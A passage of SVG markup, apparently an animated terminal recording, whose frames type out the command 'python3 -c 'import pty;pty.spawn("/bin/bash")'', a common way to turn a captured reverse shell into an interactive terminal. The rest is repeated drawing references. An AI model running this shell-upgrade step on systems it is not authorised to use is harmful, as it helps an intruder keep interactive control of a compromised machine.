class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spawn(&quot;/bin/bash</text></svg><svg x="10287"><use xlink:href="#a"/><use xlink:href="#b" x="43.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spawn(&quot;/bin/bash&quot;</text></svg><svg x="10414"><use xlink:href="#a"/><use xlink:href="#b" x="44.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><use xlink:href="#11" y="10.855"/></svg><svg x="10541"><use xlink:href="#a"/><use xlink:href="#b" x="45.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><text y="12.525" class="f">python3</text><text x="8.016" y="12.525" class="f">-c</text><text x="11.022" y="12.525" class="f">&apos;import</text><text x="19.038" y="12.525" class="f">pty;pty.spawn(&quot;/bin/bash&quot;);</text></svg><svg x="10668"><use xlink:href="#a"/><use xlink:href="#b" x="44.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><use xlink:href="#11" y="10.855"/></svg><svg x="10795"><use xlink:href="#a"/><use xlink:href="#b" x="45.996" y="10.83"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><use xlink:href="#12" y="10.855"/></svg><svg x="10922"><use xlink:href="#a"/><use xlink:href="#b" x="-.004" y="13.001"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><use xlink:href="#12" y="10.855"/></svg><svg x="11049"><use xlink:href="#a"/><use xlink:href="#b" x="-.004" y="13.001"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><use xlink:href="#12" y="10.855"/></svg><svg x="11176"><use xlink:href="#a"/><use xlink:href="#b" x="22.996" y="15.172"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><use xlink:href="#12" y="10.855"/><use xlink:href="#13" y="13.026"/><use xlink:href="#14" y="15.197"/></svg><svg x="11303"><use xlink:href="#a"/><use xlink:href="#b" x="-.004" y="17.343"/><use xlink:href="#3"/><use xlink:href="#4" y="2.171"/><use xlink:href="#5" y="4.342"/><use xlink:href="#6" y="6.513"/><use xlink:href="#7" y="8.684"/><use xlink:href="#12" y="10.855"/><use xlink:href="#13" y="13.026"/><use xlink:href="#14" y="15.197"/></svg></svg></g></g></svg></svg>